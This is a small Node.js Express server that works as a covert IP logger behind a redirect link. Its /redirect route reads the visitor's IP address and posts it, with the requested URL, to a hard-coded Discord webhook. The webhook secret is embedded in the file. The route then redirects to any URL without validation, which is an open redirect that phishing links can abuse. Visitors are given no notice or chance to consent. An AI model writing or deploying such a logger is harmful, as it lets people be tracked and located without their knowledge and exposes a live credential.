const express = require('express');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

// Your webhook URL
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1505570928007057630/fHIzbKRE8m8Ziso_WzM5Cifde8WM8cE-sfE-Ceq8C1e4qvA-v0w5GlY35mW0ySgQe6H';

app.use(express.json());

app.get('/redirect', (req, res) => {
  // Extract user IP, handle multiple IPs
  const ipHeader = req.headers['x-forwarded-for'];
  const userIp = ipHeader ? ipHeader.split(',')[0] : req.socket.remoteAddress;

  // Get target URL from query param
  const targetUrl = req.query.url;

  if (!targetUrl) {
    return res.status(400).send('No URL provided');
  }

  // Send info to webhook
  fetch(WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ ip: userIp, url: targetUrl }),
  }).catch(error => {
    console.error('Error sending webhook:', error);
  });

  // Redirect to target URL
  res.redirect(targetUrl);
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
